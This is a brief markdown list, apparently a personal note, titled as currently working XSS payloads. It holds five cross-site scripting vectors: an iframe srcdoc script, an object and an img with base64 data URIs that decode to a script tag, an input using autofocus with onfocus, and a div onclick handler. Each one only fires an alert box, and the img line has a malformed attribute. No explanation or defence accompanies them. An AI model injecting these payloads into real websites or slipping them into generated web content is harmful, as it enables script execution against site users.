# Currently found working xss using ports
```
<iframe srcdoc="<script>alert('XSS cez srcdoc')</script>"></iframe>

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>

<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" ="alert('XSS')"/>

<input type="text" value="" autofocus onfocus="alert('XSS')"/>

<div onclick="alert('XSS')">test</div>
```